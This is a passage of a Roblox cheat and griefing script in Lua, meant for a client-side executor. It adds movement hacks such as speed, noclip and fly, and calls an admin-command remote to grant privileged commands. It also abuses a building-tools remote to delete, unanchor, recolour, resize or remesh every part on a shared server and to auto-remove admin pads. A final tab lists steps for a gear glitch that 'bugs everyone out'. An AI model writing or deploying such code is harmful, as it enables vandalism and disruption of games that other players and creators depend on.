		local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
		if Humanoid then Humanoid.WalkSpeed = SpeedEnabled and SpeedValue or 16 end
	end

	Player.CharacterAdded:Connect(function(Character)
		local Humanoid = Character:WaitForChild("Humanoid")
		task.wait(0.1)
		if SpeedEnabled then Humanoid.WalkSpeed = SpeedValue end
	end)

	TabMove:CreateToggle({
		name = "Custom Speed",
		value = false,
		callback = function(Value) SpeedEnabled = Value UpdateSpeed() end,
	})

	TabMove:CreateSlider({
		name = "Speed",
		range = { 16, 250 },
		increment = 1,
		value = 16,
		suffix = " Speed",
		callback = function(Value) SpeedValue = Value UpdateSpeed() end,
	})
end

do
	local Players = game:GetService("Players")
	local Player = Players.LocalPlayer
	local JumpEnabled = false
	local JumpValue = 60

	local function UpdateJump()
		local Character = Player.Character
		local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
		if Humanoid then Humanoid.JumpPower = JumpEnabled and JumpValue or 50 end
	end

	Player.CharacterAdded:Connect(function(Character)
		local Humanoid = Character:WaitForChild("Humanoid")
		task.wait(0.1)
		if JumpEnabled then Humanoid.JumpPower = JumpValue end
	end)

	TabMove:CreateToggle({
		name = "Custom Jump",
		value = false,
		callback = function(Value) JumpEnabled = Value UpdateJump() end,
	})

	TabMove:CreateSlider({
		name = "Jump",
		range = { 30, 500 },
		increment = 1,
		value = 50,
		suffix = " Power",
		callback = function(Value) JumpValue = Value UpdateJump() end,
	})
end

do
	local Player = game.Players.LocalPlayer
	local Noclip = false
	TabMove:CreateToggle({
		name = "Noclip",
		value = false,
		callback = function(Value) Noclip = Value end,
	})
	game:GetService("RunService").Stepped:Connect(function()
		if Noclip and Player.Character then
			for _, part in pairs(Player.Character:GetDescendants()) do
				if part:IsA("BasePart") then part.CanCollide = false end
			end
		end
	end)
end

do
	local flying = false
	local flySpeed = 50
	local player = game.Players.LocalPlayer
	local UIS = game:GetService("UserInputService")
	local RunService = game:GetService("RunService")
	local bv, bg, fc

	local function stopFly()
		if fc then fc:Disconnect() fc = nil end
		if bv then bv:Destroy() bv = nil end
		if bg then bg:Destroy() bg = nil end
	end

	local function startFly()
		stopFly()
		local Character = player.Character or player.CharacterAdded:Wait()
		local HRP = Character:WaitForChild("HumanoidRootPart")
		bv = Instance.new("BodyVelocity")
		bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
		bv.Velocity = Vector3.zero
		bv.Parent = HRP
		bg = Instance.new("BodyGyro")
		bg.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
		bg.P = 10000
		bg.Parent = HRP
		fc = RunService.RenderStepped:Connect(function()
			if not flying or not Character or not HRP then return end
			local Camera = workspace.CurrentCamera
			local MoveDir = Vector3.zero
			if UIS:IsKeyDown(Enum.KeyCode.W) then MoveDir += Camera.CFrame.LookVector end
			if UIS:IsKeyDown(Enum.KeyCode.S) then MoveDir -= Camera.CFrame.LookVector end
			if UIS:IsKeyDown(Enum.KeyCode.A) then MoveDir -= Camera.CFrame.RightVector end
			if UIS:IsKeyDown(Enum.KeyCode.D) then MoveDir += Camera.CFrame.RightVector end
			if UIS:IsKeyDown(Enum.KeyCode.Space) then MoveDir += Vector3.new(0,1,0) end
			if UIS:IsKeyDown(Enum.KeyCode.LeftControl) then MoveDir -= Vector3.new(0,1,0) end
			bv.Velocity = MoveDir.Magnitude > 0 and MoveDir.Unit * flySpeed or Vector3.zero
			bg.CFrame = Camera.CFrame
		end)
	end

	player.CharacterAdded:Connect(function()
		if flying then task.wait(0.5) startFly() end
	end)

	TabMove:CreateToggle({
		name = "Fly",
		value = false,
		callback = function(Value)
			flying = Value
			if flying then startFly() else stopFly() end
		end,
	})

	TabMove:CreateSlider({
		name = "Fly Speed",
		range = { 10, 500 },
		increment = 1,
		value = 50,
		suffix = " Speed",
		callback = function(Value) flySpeed = Value end,
	})
end

TabMove:CreateSection({ name = "For Mobile" })

do
	local Players = game:GetService("Players")
	local Player = Players.LocalPlayer
	local SpeedEnabledM = false
	local SpeedValueM = 16
	local JumpEnabledM = false
	local JumpValueM = 50

	local function UpdateSpeedM()
		local Character = Player.Character
		local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
		if Humanoid then Humanoid.WalkSpeed = SpeedEnabledM and SpeedValueM or 16 end
	end

	local function UpdateJumpM()
		local Character = Player.Character
		local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
		if Humanoid then Humanoid.JumpPower = JumpEnabledM and JumpValueM or 50 end
	end

	Player.CharacterAdded:Connect(function(Character)
		local Humanoid = Character:WaitForChild("Humanoid")
		if SpeedEnabledM then Humanoid.WalkSpeed = SpeedValueM end
		if JumpEnabledM then Humanoid.JumpPower = JumpValueM end
	end)

	TabMove:CreateToggle({
		name = "Custom Speed (Mobile)",
		value = false,
		callback = function(Value) SpeedEnabledM = Value UpdateSpeedM() end,
	})
	TabMove:CreateInput({
		name = "Speed Value",
		value = "16",
		placeholder = "Enter speed",
		numeric = true,
		callback = function(Text)
			local n = tonumber(Text)
			if n then SpeedValueM = n UpdateSpeedM() end
		end,
	})
	TabMove:CreateToggle({
		name = "Custom Jump (Mobile)",
		value = false,
		callback = function(Value) JumpEnabledM = Value UpdateJumpM() end,
	})
	TabMove:CreateInput({
		name = "Jump Power",
		value = "50",
		placeholder = "Enter jump power",
		numeric = true,
		callback = function(Text)
			local n = tonumber(Text)
			if n then JumpValueM = n UpdateJumpM() end
		end,
	})

	do
		local flyingM = false
		local flySpeedM = 50
		local UIS = game:GetService("UserInputService")
		local RunService = game:GetService("RunService")
		local bvM, bgM, fcM

		local function stopFlyM()
			if fcM then fcM:Disconnect() fcM = nil end
			if bvM then bvM:Destroy() bvM = nil end
			if bgM then bgM:Destroy() bgM = nil end
		end

		local function startFlyM()
			stopFlyM()
			local Character = Player.Character or Player.CharacterAdded:Wait()
			local HRP = Character:WaitForChild("HumanoidRootPart")
			bvM = Instance.new("BodyVelocity")
			bvM.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
			bvM.Velocity = Vector3.zero
			bvM.Parent = HRP
			bgM = Instance.new("BodyGyro")
			bgM.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
			bgM.P = 10000
			bgM.Parent = HRP
			fcM = RunService.RenderStepped:Connect(function()
				if not flyingM or not Character or not HRP then return end
				local Camera = workspace.CurrentCamera
				local MoveDir = Vector3.zero
				if UIS:IsKeyDown(Enum.KeyCode.W) then MoveDir += Camera.CFrame.LookVector end
				if UIS:IsKeyDown(Enum.KeyCode.S) then MoveDir -= Camera.CFrame.LookVector end
				if UIS:IsKeyDown(Enum.KeyCode.A) then MoveDir -= Camera.CFrame.RightVector end
				if UIS:IsKeyDown(Enum.KeyCode.D) then MoveDir += Camera.CFrame.RightVector end
				if UIS:IsKeyDown(Enum.KeyCode.Space) then MoveDir += Vector3.new(0,1,0) end
				if UIS:IsKeyDown(Enum.KeyCode.LeftControl) then MoveDir -= Vector3.new(0,1,0) end
				bvM.Velocity = MoveDir.Magnitude > 0 and MoveDir.Unit * flySpeedM or Vector3.zero
				bgM.CFrame = Camera.CFrame
			end)
		end

		Player.CharacterAdded:Connect(function()
			if flyingM then task.wait(0.5) startFlyM() end
		end)

		TabMove:CreateToggle({
			name = "Fly (Mobile)",
			value = false,
			callback = function(Value)
				flyingM = Value
				if flyingM then startFlyM() else stopFlyM() end
			end,
		})
		TabMove:CreateInput({
			name = "Fly Speed (Mobile)",
			value = "50",
			placeholder = "Enter fly speed",
			numeric = true,
			callback = function(Text)
				local n = tonumber(Text)
				if n and n > 0 then flySpeedM = n end
			end,
		})
	end
end


local TabCmd = window:CreateTab({ name = "Command" })

local function HDCmd(cmd)
	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(cmd)
end

local commands = {
	{ name = "logs",                      cmd = ";logs" },
	{ name = "invisible - Vip+",          cmd = ";invisible" },
	{ name = "visible - Vip+",            cmd = ";visible" },
	{ name = "refresh - Vip+",            cmd = ";re" },
	{ name = "unice - Vip+",              cmd = ";unice" },
	{ name = "unfreeze - Vip+",           cmd = ";unfreeze" },
	{ name = "fly - Mod+",                cmd = ";fly" },
	{ name = "inf hp - Mod+",             cmd = ";health me inf" },
	{ name = "chatlogs - Mod+",           cmd = ";chatlogs" },
	{ name = "uncmdbar2 others - Admin+", cmd = ";uncmdbar2 others" },
	{ name = "unfly others - Admin+",     cmd = ";unfly others" },
	{ name = "btools - Admin+",           cmd = ";btools" },
	{ name = "Fork3x - Admin+",           cmd = ";Fork3x" },
	{ name = "disco - Admin+",            cmd = ";disco" },
	{ name = "Night - Admin+",            cmd = ";time 150" },
	{ name = "Night2 - Admin+",           cmd = ";time 1" },
	{ name = "unpunish - Admin+",         cmd = ";unpunish" },
	{ name = "bring all - Admin+",        cmd = ";bring all" },
	{ name = "savemap - Head Admin",      cmd = ";savemap" },
	{ name = "loadmap - Head Admin",      cmd = ";loadmap" },
	{ name = "wtools - Head Admin",       cmd = ";wtools" },
}

for _, c in ipairs(commands) do
	local command = c.cmd
	TabCmd:CreateButton({
		name = c.name,
		callback = function() HDCmd(command) end,
	})
end

TabCmd:CreateSection({ name = "Special Command" })

do
	local ColorCodes = { Red="r", Orange="o", Yellow="y", Green="g", DarkGreen="dg", Blue="b", DarkBlue="db", Purple="p", Pink="pk", Black="bk", White="w" }
	local ColorList = { "r","o","y","g","dg","b","db","p","pk","bk","w" }
	local TeamColor = "Rainbow"
	local TeamName = ""

	local function randomText(length)
		local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
		local text = ""
		for i = 1, length do
			local index = math.random(#chars)
			text = text .. chars:sub(index, index)
		end
		return text
	end

	TabCmd:CreateDropdown({
		name = "Team Color",
		options = { "Red","Orange","Yellow","Green","DarkGreen","Blue","DarkBlue","Purple","Pink","Black","White","Rainbow" },
		value = "Rainbow",
		callback = function(Value) TeamColor = Value end,
	})
	TabCmd:CreateInput({
		name = "Team Name",
		value = "",
		placeholder = "Enter team name",
		callback = function(Value) TeamName = Value end,
	})
	TabCmd:CreateToggle({
		name = "Auto Create Team - Head Admin",
		value = false,
		callback = function(Value)
			getgenv().AutoTeam = Value
			task.spawn(function()
				while getgenv().AutoTeam do
					local color = TeamColor == "Rainbow" and ColorList[math.random(#ColorList)] or ColorCodes[TeamColor]
					game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";createTeam " .. color .. " ❖" .. TeamName + " " .. randomText(5))
					wait(1)
				end
			end)
		end,
	})
end


local TabRain = window:CreateTab({ name = "Rain" })

local function spawnRain(meshId, texId, meshScale, partSize)
	task.spawn(function()
		local remote = getBtools()
		if not remote then
			window:Notify({ title = "Error", content = "Need btools in inventory", duration = 3 })
			return
		end
		local player = game.Players.LocalPlayer
		local hrpcf = player.Character.HumanoidRootPart.CFrame

		while task.wait(0.5) do
			local x = hrpcf.x
			local z = hrpcf.z
			local xloc = math.random(-650, 650) + x
			local zloc = math.random(-650, 650) + z
			local ybase = player.Character.HumanoidRootPart.CFrame.y + 400

			task.spawn(function()
				local part = remote:InvokeServer("CreatePart", "Normal",
					CFrame.new(math.floor(xloc), math.random(ybase, ybase + 400), math.floor(zloc)),
					workspace)
				if not part then return end

				remote:InvokeServer("SetName",       { part }, "b_1337")
				remote:InvokeServer("SyncAnchor",    { { Part = part, Anchored = false } })
				remote:InvokeServer("CreateMeshes",  { { Part = part } })
				remote:InvokeServer("SyncResize",    { { Part = part, CFrame = part.CFrame, Size = Vector3.new(partSize, partSize, partSize) } })
				remote:InvokeServer("SyncMesh",      { { Part = part, Scale     = Vector3.new(meshScale, meshScale, meshScale) } })
				remote:InvokeServer("SyncMesh",      { { Part = part, MeshId    = "rbxassetid://" .. meshId } })
				remote:InvokeServer("SyncMesh",      { { Part = part, TextureId = "rbxassetid://" .. texId } })
				remote:InvokeServer("SyncCollision", { { Part = part, CanCollide = true } })
			end)
		end
	end)
end

local rainItems = {
	{ name = "Duck Rain",  meshId = "10749878672",     texId = "10749878886",     meshScale = 200, partSize = 100 },
	{ name = "Nuke",       meshId = "130297981860341", texId = "108568635640683", meshScale = 100, partSize = 50  },
	{ name = "bacon",      meshId = "5533603778",      texId = "5533603817",      meshScale = 100, partSize = 50  },
	{ name = "Snoop Dogg", meshId = "128145018050291", texId = "118571687831161", meshScale = 60,  partSize = 50  },
	{ name = "Nyancat",    meshId = "18590936015",     texId = "18590936138",     meshScale = 140, partSize = 100 },
	{ name = "Teto",       meshId = "97894015322218",  texId = "99135678491715",  meshScale = 140, partSize = 100 },
	{ name = "Russia",     meshId = "73022445614569",  texId = "97436150160554",  meshScale = 70,  partSize = 50  },
	{ name = "Jackpot",    meshId = "121954609542428", texId = "90582987896067",  meshScale = 60,  partSize = 50  },
	{ name = "Sparxie",    meshId = "139544488333545", texId = "81656504385110",  meshScale = 150, partSize = 50  },
	{ name = "Evernight",  meshId = "113641557833030", texId = "74316456894400",  meshScale = 150, partSize = 50  },
	{ name = "Obama",      meshId = "77127821501929",  texId = "138142518090299", meshScale = 100, partSize = 50  },
    { name = "Larva",      meshId = "17335385174",     texId = "17335385273",     meshScale = 500, partSize = 100 },
}

for _, item in ipairs(rainItems) do
	local mid, tid, ms, ps = item.meshId, item.texId, item.meshScale, item.partSize
	TabRain:CreateButton({
		name = item.name,
		callback = function() spawnRain(mid, tid, ms, ps) end,
	})
end


local TabGrief = window:CreateTab({ name = "Grief" })

TabGrief:CreateButton({
	name = "Unanchor All",
	callback = function()
		task.spawn(function()
			local remote = getBtools()
			if not remote then
				window:Notify({ title = "Error", content = "Need btools in inventory", duration = 3 })
				return
			end
			local parts = {}
			for _, v in workspace:GetDescendants() do
				if v:IsA("BasePart") then
					table.insert(parts, v)
				end
			end
			local count = 0
			for _, part in ipairs(parts) do
				task.spawn(function()
					pcall(function() remote:InvokeServer("SetLocked",  { part }, false) end)
					pcall(function() remote:InvokeServer("SyncAnchor", { { Part = part, Anchored = false } }) end)
				end)
				count += 1
			end
			window:Notify({
				title   = "Unanchor All",
				content = "Sent unanchor to " .. count .. " parts",
				duration = 4,
			})
		end)
	end,
})

TabGrief:CreateButton({
	name = "Atomic mesh all",
	callback = function()
		task.spawn(function()
			local remote = getBtools()
			if not remote then
				window:Notify({ title = "Error", content = "Need btools in inventory", duration = 3 })
				return
			end
			local parts = {}
			for _, v in workspace:GetDescendants() do
				if v:IsA("BasePart") then
					table.insert(parts, v)
				end
			end
			for _, v in ipairs(parts) do
				task.spawn(function()
					pcall(function() remote:InvokeServer("SetLocked",    { v }, false) end)
					pcall(function() remote:InvokeServer("CreateMeshes", { { Part = v } }) end)
					task.wait(0.05)
					pcall(function() remote:InvokeServer("SyncMesh", { { Part = v, MeshId    = "rbxassetid://12902786354" } }) end)
					pcall(function() remote:InvokeServer("SyncMesh", { { Part = v, TextureId = "rbxassetid://12902786354" } }) end)
					pcall(function() remote:InvokeServer("SyncMesh", { { Part = v, Scale     = Vector3.new(100, 100, 100) } }) end)
				end)
			end
			window:Notify({ title = "Atomic Mesh", content = "Sent to " .. #parts .. " parts", duration = 3 })
		end)
	end,
})

TabGrief:CreateButton({
	name = "Restore All Meshes",
	callback = function()
		task.spawn(function()
			local remote = getBtools()
			if not remote then
				window:Notify({ title = "Error", content = "you need btools bro", duration = 3 })
				return
			end
			local count = 0
			for _, v in pairs(workspace:GetDescendants()) do
				if v:IsA("BasePart") then
					task.spawn(function()
						pcall(function()
							for _, mesh in pairs(v:GetChildren()) do
								if mesh:IsA("SpecialMesh") then
									remote:InvokeServer("Remove", { mesh })
								end
							end
							if v:IsA("MeshPart") then
								remote:InvokeServer("SyncMesh", { { Part = v, MeshId = "" } })
							end
						end)
					end)
					count += 1
				end
			end
			window:Notify({ title = "F3X", content = "Meshes Restored: " .. count, duration = 5 })
		end)
	end,
})

do
	local TARGET_MESH_ID = "12902786354"
	local Enabled = false
	local DescendantConnection
	local ChangedConnections = {}

	local function DisconnectMeshConnection(obj)
		if ChangedConnections[obj] then
			ChangedConnections[obj]:Disconnect()
			ChangedConnections[obj] = nil
		end
	end

	local function RemoveMesh(obj)
		if not Enabled then return end
		if obj:IsA("MeshPart") then
			local ok, meshId = pcall(function() return tostring(obj.MeshId) end)
			if ok and meshId:find(TARGET_MESH_ID, 1, true) then
				DisconnectMeshConnection(obj)
				obj:Destroy()
			end
		elseif obj:IsA("SpecialMesh") then
			local meshId = tostring(obj.MeshId)
			if meshId:find(TARGET_MESH_ID, 1, true) then
				DisconnectMeshConnection(obj)
				if obj.Parent then obj.Parent:Destroy() else obj:Destroy() end
			end
		end
	end

	local function WatchObject(obj)
		if not Enabled then return end
		RemoveMesh(obj)
		if obj:IsA("MeshPart") or obj:IsA("SpecialMesh") then
			DisconnectMeshConnection(obj)
			ChangedConnections[obj] = obj:GetPropertyChangedSignal("MeshId"):Connect(function() RemoveMesh(obj) end)
			obj.Destroying:Connect(function() DisconnectMeshConnection(obj) end)
		end
	end

	TabGrief:CreateToggle({
		name = "Anti Atomic Mesh V2",
		value = false,
		callback = function(Value)
			Enabled = Value
			if Value then
				for _, obj in ipairs(workspace:GetDescendants()) do WatchObject(obj) end
				if DescendantConnection then DescendantConnection:Disconnect() end
				DescendantConnection = workspace.DescendantAdded:Connect(WatchObject)
			else
				if DescendantConnection then DescendantConnection:Disconnect() DescendantConnection = nil end
				for _, conn in pairs(ChangedConnections) do if conn then conn:Disconnect() end end
				table.clear(ChangedConnections)
			end
		end,
	})
end

do
	getgenv().AutoDeletePads = false
	TabGrief:CreateToggle({
		name = "Auto Delete Admin Pads",
		value = false,
		callback = function(Value)
			getgenv().AutoDeletePads = Value
			if Value then
				task.spawn(function()
					local remote = getBtools()
					if not remote then
						window:Notify({ title = "Error", content = "u need btools", duration = 3 })
						getgenv().AutoDeletePads = false
						return
					end
					while getgenv().AutoDeletePads do
						local adminPad = workspace:FindFirstChild("adminobby") and workspace.adminobby:FindFirstChild("pad")
						if adminPad then pcall(function() remote:InvokeServer("Remove", { adminPad }) end) end
						for _, obj in ipairs(workspace:GetDescendants()) do
							if obj.Name == "WrenchObjs" then
								for _, v in ipairs(obj:GetChildren()) do
									if v.Name == "pad" then
										pcall(function() remote:InvokeServer("Remove", { v }) end)
									end
								end
							end
						end
						task.wait(1)
					end
				end)
			end
		end,
	})
end

TabGrief:CreateButton({
	name = "Rotate all",
	callback = function()
		task.spawn(function()
			local remote = getBtools()
			if not remote then return end
			for _, v in ipairs(workspace:GetDescendants()) do
				if v:IsA("BasePart") then
					task.spawn(function()
						pcall(function() remote:InvokeServer("SetLocked", { v }, false) end)
						pcall(function() remote:InvokeServer("SyncMove",  { { Part = v, CFrame = v.CFrame * CFrame.Angles(math.random(0,1), math.random(0,1), math.random(0,1)) } }) end)
					end)
				end
			end
		end)
	end,
})






TabGrief:CreateButton({
	name = "Delete All Parts",
	callback = function()
		task.spawn(function()
			local remote = getBtools()
			if not remote then
				window:Notify({ title = "Error", content = "Need btools in inventory", duration = 3 })
				return
			end
			local parts = {}
			for _, v in ipairs(workspace:GetDescendants()) do
				if v:IsA("BasePart")
					and not v:IsDescendantOf(game.Players.LocalPlayer.Character) then
					table.insert(parts, v)
				end
			end
			local count = 0
			for i, v in ipairs(parts) do
				pcall(function() remote:InvokeServer("SetLocked", { v }, false) end)
				pcall(function() remote:InvokeServer("Remove",    { v }) end)
				count += 1
				if i % 20 == 0 then task.wait() end  -- yield every 20 to kill lag
			end
			window:Notify({ title = "Delete All Parts", content = "Nuked " .. count .. " parts", duration = 4 })
		end)
	end,
})


do
	local COLORS = {
		Color3.fromRGB(196, 40,  28),   -- Bright Red
		Color3.fromRGB(13,  105, 172),  -- Bright Blue
		Color3.fromRGB(245, 205, 47),   -- Bright Yellow
		Color3.fromRGB(39,  70,  45),   -- Dark Green
		Color3.fromRGB(102, 164, 74),   -- Bright Green
		Color3.fromRGB(255, 140, 0),    -- Orange
		Color3.fromRGB(163, 75,  75),   -- Reddish Brown
		Color3.fromRGB(193, 190, 192),  -- Light Grey
		Color3.fromRGB(99,  95,  98),   -- Dark Grey
		Color3.fromRGB(255, 255, 255),  -- White
		Color3.fromRGB(27,  42,  52),   -- Black
		Color3.fromRGB(255, 175, 190),  -- Pink
		Color3.fromRGB(215, 197, 154),  -- Tan
		Color3.fromRGB(106, 127, 63),   -- Olive Green
		Color3.fromRGB(0,   143, 156),  -- Teal
		Color3.fromRGB(123, 46,  47),   -- Dark Red
		Color3.fromRGB(0,   16,  176),  -- Navy Blue
		Color3.fromRGB(255, 219, 42),   -- Neon Yellow
		Color3.fromRGB(18,  238, 212),  -- Cyan
		Color3.fromRGB(170, 0,   170),  -- Magenta
		Color3.fromRGB(255, 0,   0),    -- Pure Red
		Color3.fromRGB(0,   255, 0),    -- Lime
		Color3.fromRGB(0,   0,   255),  -- Pure Blue
		Color3.fromRGB(255, 165, 0),    -- Gold
		Color3.fromRGB(128, 0,   128),  -- Purple
	}

	TabGrief:CreateButton({
		name = "Color Spam All",
		callback = function()
			task.spawn(function()
				local remote = getBtools()
				if not remote then
					window:Notify({ title = "Error", content = "Need btools in inventory", duration = 3 })
					return
				end
				local parts = {}
				for _, v in ipairs(workspace:GetDescendants()) do
					if v:IsA("BasePart") then
						table.insert(parts, v)
					end
				end
				local count = 0
				for i, v in ipairs(parts) do
					local col = COLORS[math.random(#COLORS)]
					pcall(function() remote:InvokeServer("SetLocked", { v }, false) end)
					pcall(function() remote:InvokeServer("SyncColor", { { Part = v, Color = col, UnionColoring = false } }) end)
					count += 1
					if i % 20 == 0 then task.wait() end
				end
				window:Notify({ title = "Color Spam", content = "Painted " .. count .. " parts", duration = 3 })
			end)
		end,
	})
end


TabGrief:CreateButton({
	name = "Resize Spam",
	callback = function()
		task.spawn(function()
			local remote = getBtools()
			if not remote then
				window:Notify({ title = "Error", content = "Need btools in inventory", duration = 3 })
				return
			end
			local parts = {}
			for _, v in ipairs(workspace:GetDescendants()) do
				if v:IsA("BasePart")
					and not v:IsDescendantOf(game.Players.LocalPlayer.Character) then
					table.insert(parts, v)
				end
			end
			local count = 0
			for i, v in ipairs(parts) do
				pcall(function() remote:InvokeServer("SetLocked", { v }, false) end)
				pcall(function()
					remote:InvokeServer("SyncResize", { {
						Part   = v,
						CFrame = v.CFrame,
						Size   = Vector3.new(
							math.random(50, 200),
							math.random(50, 200),
							math.random(50, 200)
						)
					} })
				end)
				count += 1
				if i % 20 == 0 then task.wait() end  
			end
			window:Notify({ title = "Resize Spam", content = "Resized " .. count .. " parts", duration = 3 })
		end)
	end,
})


do
	local AntiVoidEnabled = false
	local AntiVoidConn = nil
	local VOID_THRESHOLD = -100  -- if Y drops below this, teleport up

	TabGrief:CreateToggle({
		name = "Anti-Kill Void",
		value = false,
		callback = function(Value)
			AntiVoidEnabled = Value
			if Value then
				if AntiVoidConn then AntiVoidConn:Disconnect() end
				AntiVoidConn = game:GetService("RunService").Heartbeat:Connect(function()
					local char = game.Players.LocalPlayer.Character
					if not char then return end
					local hrp = char:FindFirstChild("HumanoidRootPart")
					local hum = char:FindFirstChildOfClass("Humanoid")
					if not hrp or not hum then return end
					if hrp.Position.Y < VOID_THRESHOLD then

						hrp.CFrame = CFrame.new(hrp.Position.X, VOID_THRESHOLD + 20, hrp.Position.Z)
						hum.Health = hum.MaxHealth
					end
				end)
			else
				if AntiVoidConn then
					AntiVoidConn:Disconnect()
					AntiVoidConn = nil
				end
			end
		end,
	})
end




local TabGear = window:CreateTab({ name = "Gear" })

do
	local gearLol = false
	TabGear:CreateToggle({
		name = "Get Boombox - Mod+",
		value = false,
		callback = function(Value)
			gearLol = Value
			while gearLol do
				wait(1)
				game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";gear me 212641536")
			end
		end,
	})
end

local TabGearGlitch = window:CreateTab({ name = "Gear Glitches" })

local HDCmd2 = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand

TabGearGlitch:CreateButton({
	name = "Snowflake Shuriken",
	callback = function()
		HDCmd2:InvokeServer(";gear me 188644205")
	end,
})

TabGearGlitch:CreateButton({
	name = "Remote Explosive Detonator",
	callback = function()
		HDCmd2:InvokeServer(";gear me 74385399")
	end,
})

TabGearGlitch:CreateButton({
	name = "Emerald Dragon Staff",
	callback = function()
		HDCmd2:InvokeServer(";gear me 221241923")
	end,
})

TabGearGlitch:CreateSection({ name = "Gear Glitch to rig the map" })
TabGearGlitch:CreateSection({ name = "1. Get yourself the Remote Explosive Detonator" })
TabGearGlitch:CreateSection({ name = "2. Place it on ground and get Snowflake Shuriken" })
TabGearGlitch:CreateSection({ name = "3. Shoot the Detonator with Snowflake Shuriken" })
TabGearGlitch:CreateSection({ name = "4. Lastly shoot it with Emerald Dragon Staff" })
TabGearGlitch:CreateSection({ name = "Result: spins the map and bugs everyone out" })

print("executed")
